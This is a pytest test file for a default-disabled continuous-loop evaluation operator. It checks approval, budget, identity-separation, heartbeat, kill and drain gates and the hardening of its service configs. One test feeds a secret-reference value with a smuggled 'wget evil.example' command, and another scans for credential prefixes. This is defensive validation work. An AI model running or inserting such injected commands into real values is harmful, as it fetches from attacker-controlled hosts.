"""Focused contracts for the disabled continuous-loop operator adapters."""

from __future__ import annotations

import io
import json
import os
import plistlib
import shutil
import stat
import subprocess
from contextlib import redirect_stdout
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace

import pytest
import yaml

from evallab.execution_contracts import PaidRunAuthorization
from evallab.ops_continuous import (
    KILL_DISPOSITION,
    REASON_BILLABLE_REFUSED,
    REASON_DEFAULT_DISABLED,
    REASON_DRAIN_INCOMPLETE,
    REASON_MISSING_BUDGET,
    REASON_MISSING_ENABLE_TOKEN,
    REASON_MISSING_SECRET,
    REASON_MISSING_STANDING_APPROVAL,
    REASON_SAME_IDENTITY,
    REASON_STALE_HEARTBEAT,
    ContinuousLoopPolicy,
    bind_policy_digest,
    main,
    policy_complete,
    public_sha256_is_not_a_signature,
)

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts/ops/continuous-operator"
KEYCHAIN = ROOT / "scripts/ops/keychain-inject.sh"
PLIST = ROOT / "scripts/ops/launchd/com.petermakhnatch.evallab.continuous-operator.plist"
SERVICE = ROOT / "scripts/ops/systemd/evallab-continuous-operator.service"
TIMER = ROOT / "scripts/ops/systemd/evallab-continuous-operator.timer"
COMPOSE = ROOT / "containers/continuous-operator/compose.yaml"
DOCKERFILE = ROOT / "containers/continuous-operator/Dockerfile"
EXAMPLE_POLICY = ROOT / "policy/continuous-loop-policy.example.yaml"
STANDING = ROOT / "policy/standing-approvals.yaml"
SECRET_SCAN_ROOTS = (
    ROOT / "scripts/ops",
    ROOT / "containers/continuous-operator",
    ROOT / "policy/continuous-loop-policy.example.yaml",
    ROOT / "src/evallab/ops_continuous.py",
    ROOT / "docs/continuous-loop-operator.md",
)
NOW = datetime(2026, 8, 28, tzinfo=UTC)
ENABLE = "enable-key"
APPROVAL = "approval-key"
BUDGET = "budget-key"
MAC_KEY = b"eval-lab-operator-mac-key-32bytes!"
EXPIRES = NOW + timedelta(days=1)


def _auth(*, actor: str, spec_id: str, at: datetime = NOW) -> dict:
    return {
        "spec_id": spec_id,
        "actor": actor,
        "authorized_at": at.isoformat(),
        "quota_override": False,
    }


def _budget(*, actor: str = BUDGET) -> dict:
    return {
        **_auth(actor=actor, spec_id="01CONTINUOUSBUDGET0000000001"),
        "scope": ["continuous-loop"],
        "expires_at": EXPIRES.isoformat(),
        "ceiling_usd": 20,
    }


def _budget_payload(*, actor: str = BUDGET) -> dict:
    body = _budget(actor=actor)
    return {
        "actor": body["actor"],
        "ceiling_usd": body["ceiling_usd"],
        "expires_at": EXPIRES.isoformat(),
        "scope": list(body["scope"]),
        "spec_id": body["spec_id"],
    }


def _complete_policy_body(*, stale_after: float = 60.0, drain_timeout: float = 5.0) -> dict:
    approval = PaidRunAuthorization(
        spec_id="01CONTINUOUSAPPROVAL00000001",
        actor=APPROVAL,
        authorized_at=NOW,
    )
    unsigned = {
        "policy_schema_version": "1",
        "approval_signature_ref": APPROVAL,
        "approval_digest": "0" * 64,
        "slo_freshness": {
            "max_queue_admission_lag_seconds": 30,
            "max_dispatch_latency_seconds": 30,
            "max_oldest_postrun_lag_seconds": 30,
            "max_oldest_catalog_settle_lag_seconds": 30,
            "max_oldest_quality_lag_seconds": 30,
            "max_oldest_projection_lag_seconds": 30,
            "max_oldest_analysis_lag_seconds": 30,
            "status_snapshot_max_age_seconds": 30,
        },
        "operational_limits": {
            "scheduler_heartbeat_interval_seconds": 15,
            "scheduler_stale_after_seconds": stale_after,
            "worker_heartbeat_interval_seconds": 15,
            "lease_ttl_seconds": 60,
            "fencing_grace_seconds": 15,
            "max_concurrent_workers": 1,
            "postrun_hook_timeout_seconds": 30,
            "maintenance_drain_timeout_seconds": drain_timeout,
            "maintenance_disk_threshold_bytes": 1_000_000,
        },
        "quality_and_quarantine": {
            "quarantine_rolling_window_size": 10,
            "min_window_attempts_for_calculation": 3,
            "max_quarantine_fraction": 0.2,
            "max_warn_fraction": 0.4,
            "catalog_ingestion_warn_after_seconds": 30,
            "catalog_ingestion_pause_after_seconds": 60,
            "max_consecutive_quiet_failures": 3,
            "auto_acceptance_enabled": False,
        },
    }
    dumped = ContinuousLoopPolicy.model_validate(unsigned).model_dump(mode="json")
    dumped["approval_digest"] = bind_policy_digest(
        policy=dumped,
        approval=approval,
        budget=_budget_payload(),
        mac_key=MAC_KEY,
    )
    return {"continuous_loop_policy": dumped}


def _policy(path: Path, *, stale_after: float = 60.0, drain_timeout: float = 5.0) -> Path:
    path.write_text(yaml.safe_dump(_complete_policy_body(stale_after=stale_after, drain_timeout=drain_timeout)))
    return path


def _write_auths(state: Path, *, approval_actor: str = APPROVAL, budget_actor: str = BUDGET) -> None:
    state.mkdir(exist_ok=True)
    (state / "approval.json").write_text(
        json.dumps(_auth(actor=approval_actor, spec_id="01CONTINUOUSAPPROVAL00000001"))
    )
    (state / "budget.json").write_text(json.dumps(_budget(actor=budget_actor)))
    (state / "approval.mac").write_bytes(MAC_KEY)
    shutil.copy2(STANDING, state / "standing-approvals.yaml")


def _gate_env() -> dict[str, str]:
    return {
        "EVAL_LAB_ENABLE_TOKEN": "enable-1",
        "EVAL_LAB_ENABLE_IDENTITY": ENABLE,
        "EVAL_LAB_SECRET_REF": "keychain:lab/operator",
        "EVAL_LAB_SECRET_PRESENT": "1",
    }


def _run(
    tmp_path: Path,
    command: str,
    *,
    env: dict[str, str] | None = None,
    extra: list[str] | None = None,
    policy: Path | None = None,
    agent: str | None = None,
    now: datetime | None = None,
) -> SimpleNamespace:
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    argv = [command, "--state-dir", str(state)]
    if policy is not None:
        argv.extend(["--policy", str(policy)])
    if agent is not None:
        argv.extend(["--agent", agent])
    if extra:
        argv.extend(extra)
    merged = {**os.environ, **(env or {})}
    buf = io.StringIO()
    clock = (lambda: now) if now is not None else None
    with redirect_stdout(buf):
        code = main(argv, environ=merged, clock=clock)
    return SimpleNamespace(returncode=code, stdout=buf.getvalue())


def _payload(result: SimpleNamespace) -> dict:
    return json.loads(result.stdout)


def test_default_validate_is_disabled(tmp_path: Path) -> None:
    result = _run(tmp_path, "validate")
    body = _payload(result)
    assert result.returncode == 2
    assert body["reason"] == REASON_DEFAULT_DISABLED
    assert body["mode"] == "DISABLED"
    assert body["running"] is False


def test_missing_enable_token_when_other_gates_present(tmp_path: Path) -> None:
    result = _run(tmp_path, "validate", env={"EVAL_LAB_SECRET_REF": "keychain:lab/operator"})
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_MISSING_ENABLE_TOKEN


def test_env_self_asserted_approval_is_refused(tmp_path: Path) -> None:
    result = _run(
        tmp_path,
        "validate",
        env={"EVAL_LAB_ENABLE_TOKEN": "enable-1", "EVAL_LAB_STANDING_APPROVAL": "stand-1"},
    )
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_missing_standing_approval(tmp_path: Path) -> None:
    result = _run(tmp_path, "validate", env={"EVAL_LAB_ENABLE_TOKEN": "enable-1"})
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_parallel_signed_manifest_is_rejected(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "approval.json").write_text(
        json.dumps(
            {
                "schema_version": "1",
                "authority_kind": "campaign_approval",
                "signer_identity": APPROVAL,
                "payload": {},
                "payload_digest": "a" * 64,
                "signature": "b" * 64,
                "expires_at": (NOW + timedelta(hours=1)).isoformat(),
                "scope": ["continuous-loop"],
            }
        )
    )
    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_future_authorization_is_refused(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "approval.json").write_text(
        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001", at=NOW + timedelta(hours=1)))
    )
    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_missing_budget(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "approval.json").write_text(
        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001"))
    )
    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_BUDGET


def test_env_budget_flag_is_not_authority(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "approval.json").write_text(
        json.dumps(_auth(actor=APPROVAL, spec_id="01CONTINUOUSAPPROVAL00000001"))
    )
    env = {**_gate_env(), "EVAL_LAB_BUDGET_PRESENT": "1"}
    result = _run(tmp_path, "quota", env=env, now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_BUDGET


def test_missing_secret(tmp_path: Path) -> None:
    state = tmp_path / "state"
    _write_auths(state)
    env = {
        "EVAL_LAB_ENABLE_TOKEN": "enable-1",
        "EVAL_LAB_ENABLE_IDENTITY": ENABLE,
        "EVAL_LAB_SECRET_REF": "keychain:lab/operator",
    }
    result = _run(tmp_path, "quota", env=env, now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_MISSING_SECRET


def test_invalid_secret_ref_grammar(tmp_path: Path) -> None:
    state = tmp_path / "state"
    _write_auths(state)
    env = {
        **_gate_env(),
        "EVAL_LAB_SECRET_REF": "keychain:lab/operator; wget evil.example",
    }
    result = _run(tmp_path, "quota", env=env, now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_SECRET


def test_same_enable_and_approval_identity(tmp_path: Path) -> None:
    state = tmp_path / "state"
    _write_auths(state, approval_actor=ENABLE)
    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_SAME_IDENTITY


def test_budget_signer_must_be_distinct(tmp_path: Path) -> None:
    state = tmp_path / "state"
    _write_auths(state, budget_actor=APPROVAL)
    result = _run(tmp_path, "validate", env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_SAME_IDENTITY


def test_null_policy_fields_are_incomplete() -> None:
    raw = yaml.safe_load(EXAMPLE_POLICY.read_text())
    assert policy_complete(raw["continuous_loop_policy"]) is False


def test_billable_dry_run_refused(tmp_path: Path) -> None:
    result = _run(tmp_path, "dry-run", agent="codex")
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_BILLABLE_REFUSED


def test_oracle_dry_run_records_plan_without_harbor(tmp_path: Path) -> None:
    result = _run(tmp_path, "dry-run", agent="oracle")
    assert result.returncode == 0
    body = _payload(result)
    assert body["details"]["would_run"] == "oracle"
    assert body["details"]["harbor"] is False
    assert body["running"] is False
    plan = json.loads((tmp_path / "state/dry-run-plan.json").read_text())
    assert plan["dispatch"] is False


def test_verdict_does_not_overwrite_safety_fields(tmp_path: Path) -> None:
    _run(tmp_path, "dry-run", agent="oracle")
    colliding = {"running": True, "authorized": True, "ok": False, "note": "x"}
    from evallab.ops_continuous import _verdict, context_from_env

    ctx = context_from_env(
        state_dir=tmp_path / "state",
        policy_path=None,
        now=NOW,
        agent="oracle",
        drain_timeout_seconds=None,
        environ={},
    )
    verdict = _verdict(ctx, ok=True, reason=None, detail="x", extra=colliding)
    assert verdict.payload["running"] is False
    assert verdict.payload["authorized"] is False
    assert verdict.payload["ok"] is True
    assert "running" not in verdict.payload["details"]
    assert verdict.payload["details"]["note"] == "x"


def test_production_now_flag_rejected(tmp_path: Path) -> None:
    with pytest.raises(SystemExit):
        main(["validate", "--state-dir", str(tmp_path / "state"), "--now", NOW.isoformat()])


def test_operator_now_env_does_not_freeze_clock(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=30)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
    env = {"EVAL_LAB_OPERATOR_NOW": "2026-08-28T00:00:01+00:00"}
    result = _run(tmp_path, "status", policy=policy, env=env, now=NOW.replace(minute=5))
    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT


def test_stale_heartbeat_on_status(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=30)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW.replace(minute=5))
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT


def test_stale_heartbeat_on_validate_and_quota(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=30)
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text("2026-08-28T00:00:00+00:00\n")
    env = _gate_env()
    later = NOW.replace(minute=5)
    validate = _run(tmp_path, "validate", policy=policy, env=env, now=later)
    quota = _run(tmp_path, "quota", policy=policy, env=env, now=later)
    start = _run(tmp_path, "start", policy=policy, env=env, now=later)
    assert _payload(validate)["reason"] == REASON_STALE_HEARTBEAT
    assert _payload(quota)["reason"] == REASON_STALE_HEARTBEAT
    assert _payload(start)["reason"] == REASON_STALE_HEARTBEAT


def test_fresh_heartbeat_status_unknown_health(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text("2026-08-28T00:04:00+00:00\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW.replace(minute=5))
    assert result.returncode == 0
    body = _payload(result)
    assert body["details"]["health"]["docker"] == "unknown"
    assert body["running"] is False


def test_graceful_drain_then_timeout(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", drain_timeout=10)
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    waiting = _run(tmp_path, "drain", policy=policy, now=NOW)
    assert waiting.returncode == 2
    assert _payload(waiting)["reason"] == REASON_DRAIN_INCOMPLETE
    assert json.loads((state / "drain.json").read_text())["complete"] is False
    timed = _run(tmp_path, "drain", policy=policy, now=NOW + timedelta(seconds=11))
    assert timed.returncode == 2
    assert _payload(timed)["reason"] == REASON_DRAIN_INCOMPLETE


def test_kill_records_operator_kill(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    result = _run(tmp_path, "kill", now=NOW)
    assert result.returncode == 0
    record = json.loads((state / "kill.json").read_text())
    assert record["disposition"] == KILL_DISPOSITION
    assert record["executed"] is False
    assert record["signalled"] is False
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]
    assert (state / "mode").read_text().strip() == "KILLED"
    drain = _run(tmp_path, "drain", now=NOW + timedelta(seconds=1))
    assert drain.returncode == 2
    assert _payload(drain)["reason"] == REASON_DRAIN_INCOMPLETE
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]


def test_validate_does_not_clear_killed_or_draining(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    kill = _run(tmp_path, "kill", now=NOW)
    assert _payload(kill)["mode"] == "KILLED"
    validated = _run(tmp_path, "validate", now=NOW)
    assert (state / "mode").read_text().strip() == "KILLED"
    assert _payload(validated)["mode"] == "KILLED"
    (state / "mode").write_text("DRAINING\n")
    again = _run(tmp_path, "validate", now=NOW)
    assert (state / "mode").read_text().strip() == "DRAINING"
    assert _payload(again)["mode"] == "DRAINING"


def test_malformed_inflight_fails_closed(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps({"lease": 1}))
    result = _run(tmp_path, "drain", now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
    assert (state / "mode").read_text().strip() == "DRAINING"


def test_drain_without_timeout_still_incomplete(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    result = _run(tmp_path, "drain", now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE


def test_empty_inflight_drain_disables(tmp_path: Path) -> None:
    result = _run(tmp_path, "drain")
    assert result.returncode == 0
    assert _payload(result)["mode"] == "DISABLED"


def test_full_gates_still_non_running(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    body = _payload(result)
    assert result.returncode == 0
    assert body["mode"] == "DISABLED"
    assert body["running"] is False
    assert body["authorized"] is False
    start = _run(tmp_path, "start", policy=policy, env=_gate_env(), now=NOW)
    assert start.returncode == 2
    assert _payload(start)["reason"] == REASON_DEFAULT_DISABLED


def test_keychain_inject_never_echoes_secret_ref() -> None:
    injected = "keychain:lab/operator"
    completed = subprocess.run(
        [str(KEYCHAIN)],
        cwd=ROOT,
        capture_output=True,
        text=True,
        env={**os.environ, "EVAL_LAB_SECRET_REF": injected, "EVAL_LAB_SECRET_PRESENT": "1"},
    )
    assert "pwned" not in completed.stdout
    assert "secret_ref=" not in completed.stdout
    assert injected not in completed.stdout
    assert "probe=injected" in completed.stdout
    assert "present=yes" in completed.stdout
    assert "EVAL_LAB_SECRET_REF" not in completed.stdout


def test_launchd_plist_disabled() -> None:
    loaded = plistlib.loads(PLIST.read_bytes())
    assert loaded["Disabled"] is True
    assert loaded["RunAtLoad"] is False
    assert "KeepAlive" not in loaded
    assert loaded["Label"] == "com.petermakhnatch.evallab.continuous-operator"
    assert loaded["ProgramArguments"][0] == "/usr/local/libexec/evallab/.venv/bin/python"
    assert "/usr/bin/env" not in loaded["ProgramArguments"]
    assert "/opt/" not in loaded["ProgramArguments"][0]
    assert loaded["LimitLoadToSessionType"] == "Aqua"
    assert loaded["StandardOutPath"] == "/dev/null"
    assert loaded["StandardErrorPath"] == "/dev/null"
    assert "~/" not in loaded["StandardOutPath"]
    assert "/Users/Shared" not in loaded["StandardOutPath"]
    assert "UserName" not in loaded or loaded.get("UserName") != "root"


def test_systemd_units_not_wanted() -> None:
    service = SERVICE.read_text()
    timer = TIMER.read_text()
    assert "WantedBy=" not in service
    assert "WantedBy=" not in timer
    assert "Restart=no" in service
    assert "Persistent=false" in timer
    assert "User=evallab" in service
    assert "NoNewPrivileges=yes" in service
    assert "ProtectSystem=strict" in service
    assert "ProtectHome=yes" in service
    assert "PrivateTmp=yes" in service
    assert "RestrictAddressFamilies=AF_UNIX" in service
    assert "CapabilityBoundingSet=" in service
    assert "ExecStart=/usr/local/libexec/evallab/.venv/bin/python" in service
    assert "--state-dir /var/lib/evallab-operator" in service
    assert "StateDirectory=evallab-operator" in service
    assert "ReadWritePaths=/var/lib/evallab-operator" in service
    assert "/usr/bin/env" not in service
    assert "StateDirectoryMode=0700" in service


def test_compose_restart_no() -> None:
    compose = COMPOSE.read_text()
    dockerfile = DOCKERFILE.read_text()
    assert 'restart: "no"' in compose
    assert "profiles:" in compose
    assert 'command: ["validate", "--state-dir", "/var/lib/evallab-operator"]' in compose
    assert "/var/lib/evallab-operator:mode=0700" in compose
    assert "read_only: true" in compose
    assert "uv sync --locked" in dockerfile
    assert dockerfile.count("validate") == 1


def test_example_policy_does_not_enable() -> None:
    raw = yaml.safe_load(EXAMPLE_POLICY.read_text())
    body = raw["continuous_loop_policy"]
    assert body["approval_signature_ref"] == ""
    assert body["operational_limits"]["scheduler_stale_after_seconds"] is None


def test_script_is_executable_and_subprocess_validate(tmp_path: Path) -> None:
    mode = SCRIPT.stat().st_mode
    assert mode & stat.S_IXUSR
    state = tmp_path / "state"
    completed = subprocess.run(
        [str(SCRIPT), "validate", "--state-dir", str(state)],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 2
    assert REASON_DEFAULT_DISABLED in completed.stdout


def test_unkeyed_sha256_digest_is_rejected(tmp_path: Path) -> None:
    policy_path = tmp_path / "policy.yaml"
    body = _complete_policy_body()
    loop = body["continuous_loop_policy"]
    forged = public_sha256_is_not_a_signature(
        {
            "actor": APPROVAL,
            "authorized_at": NOW.isoformat(),
            "spec_id": "01CONTINUOUSAPPROVAL00000001",
        }
    )
    loop["approval_digest"] = forged
    policy_path.write_text(yaml.safe_dump(body))
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy_path, env=_gate_env(), now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_future_heartbeat_is_stale(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text((NOW + timedelta(hours=1)).isoformat() + "\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT


def test_killed_latch_survives_pause_restart_maintenance(tmp_path: Path) -> None:
    state = tmp_path / "state"
    _run(tmp_path, "kill", now=NOW)
    assert (state / "mode").read_text().strip() == "KILLED"
    for command in ("pause", "restart", "maintenance", "upgrade", "rollback"):
        result = _run(tmp_path, command, now=NOW)
        assert result.returncode == 2
        assert (state / "mode").read_text().strip() == "KILLED"
        assert _payload(result)["mode"] == "KILLED"


def test_recover_requires_distinct_recovery_token(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    env = _gate_env()
    refused = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
    assert refused.returncode == 2
    assert (state / "mode").read_text().strip() == "KILLED"
    env = {**env, "EVAL_LAB_RECOVERY_TOKEN": env["EVAL_LAB_ENABLE_TOKEN"]}
    same = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
    assert same.returncode == 2
    assert (state / "mode").read_text().strip() == "KILLED"
    env = {**_gate_env(), "EVAL_LAB_RECOVERY_TOKEN": "recovery-token-distinct"}
    recovered = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
    assert recovered.returncode == 0
    assert (state / "mode").read_text().strip() == "DISABLED"


def test_keychain_stdout_omits_ref_when_absent() -> None:
    injected = "keychain:not-a-valid"
    completed = subprocess.run(
        [str(KEYCHAIN)],
        cwd=ROOT,
        capture_output=True,
        text=True,
        env={**os.environ, "EVAL_LAB_SECRET_REF": injected},
    )
    assert completed.returncode == 2
    assert injected not in completed.stdout
    assert "EVAL_LAB_SECRET_REF" not in completed.stdout
    assert "secret_ref=" not in completed.stdout


def test_committed_templates_have_no_secret_literals() -> None:
    needles = ("sk-", "AKIA", "BEGIN PRIVATE", "-----BEGIN")
    for root in SECRET_SCAN_ROOTS:
        paths = [root] if root.is_file() else list(root.rglob("*"))
        for path in paths:
            if not path.is_file():
                continue
            text = path.read_text(encoding="utf-8", errors="ignore")
            for needle in needles:
                assert needle not in text, f"{path} contains {needle}"


def test_main_argv_matches_module(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    code = main(["validate", "--state-dir", str(tmp_path / "op")])
    assert code == 2
